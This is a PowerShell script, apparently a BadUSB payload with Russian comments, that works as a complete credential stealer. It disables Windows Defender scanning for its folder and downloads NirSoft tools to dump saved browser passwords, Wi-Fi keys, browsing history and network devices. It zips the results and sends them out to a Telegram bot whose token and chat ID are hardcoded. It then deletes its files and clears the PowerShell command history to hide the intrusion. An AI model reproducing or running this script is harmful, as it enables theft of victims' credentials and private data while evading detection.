#                      _                        
#  _   _  ___  _   _  | | ___ __   _____      __
# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
# | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
#  |___/                                        

$basePath = "C:\Users\Public\Documents\scripts"
$dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
$dumpFile = "$dumpFolder.zip"

# Создаем директории
New-Item -ItemType Directory -Path $basePath -Force | Out-Null
Set-Location $basePath
New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null

# Добавляем исключение в защитник, чтобы он не съел экзешники сразу
Add-MpPreference -ExclusionPath $basePath -Force

# Ссылки (Используем прямой RAW формат для надежности)
$myRepo = "https://github.com/whetherit/tools/raw/main"
$origRepo = "https://github.com/tuconnaisyouknow/BadUSB_passStealer/raw/main/other_files"

# Скачивание (Твоя ссылка теперь через /raw/, это стабильнее)
Invoke-WebRequest "$myRepo/WebBrowserPassView.exe" -OutFile "WebBrowserPassView.exe"
Invoke-WebRequest "$origRepo/WirelessKeyView.exe" -OutFile "WirelessKeyView.exe"
Invoke-WebRequest "$origRepo/BrowsingHistoryView.exe" -OutFile "BrowsingHistoryView.exe"
Invoke-WebRequest "$origRepo/WNetWatcher.exe" -OutFile "WNetWatcher.exe"

# Ждем пару секунд, чтобы файлы сохранились на диске
Start-Sleep -Seconds 2

# Выполнение инструментов
# Если файл скачался как HTML, эта команда просто не сработает, не открывая окон
if ((Get-Item "WNetWatcher.exe").Length -gt 10kb) { .\WNetWatcher.exe /stext connected_devices.txt }
if ((Get-Item "BrowsingHistoryView.exe").Length -gt 10kb) { .\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt }
if ((Get-Item "WebBrowserPassView.exe").Length -gt 10kb) { .\WebBrowserPassView.exe /stext passwords.txt }
if ((Get-Item "WirelessKeyView.exe").Length -gt 10kb) { .\WirelessKeyView.exe /stext wifi.txt }

# Ожидание создания отчетов (макс 10 секунд)
$timeout = 0
while (!(Test-Path "passwords.txt") -and $timeout -lt 10) {
    Start-Sleep -Seconds 1
    $timeout++
}

# Собираем то, что удалось достать
$filesToMove = Get-ChildItem -Path . -Include "passwords.txt","wifi.txt","connected_devices.txt","history.txt"
if ($filesToMove) {
    Move-Item $filesToMove -Destination "$dumpFolder" -ErrorAction SilentlyContinue
}

# Архивация
Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force

# Конфигурация Telegram
$token = "8453011015:AAFvYt0ZjgkUFAjtnLvONdmXl19l7GK9tfM"
$chatID = "806761221"
$uri = "https://api.telegram.org/bot$token/sendDocument"

if (Test-Path $dumpFile) {
    # Отправка через встроенный в PS метод (более современный)
    curl.exe -F "chat_id=$chatID" -F "document=@$dumpFile" -F "caption=Exfiltration from $env:USERNAME" $uri
}

# Очистка
Set-Location C:\Users\Public\Documents
Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
Remove-MpPreference -ExclusionPath $basePath -Force

# Сигнал завершения (Caps Lock)
$keyBoardObject = New-Object -ComObject WScript.Shell
for ($i=0; $i -lt 4; $i++) {
    $keyBoardObject.SendKeys("{CAPSLOCK}")
    Start-Sleep -Seconds 1
}

# Очистка истории команд
Clear-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

exit
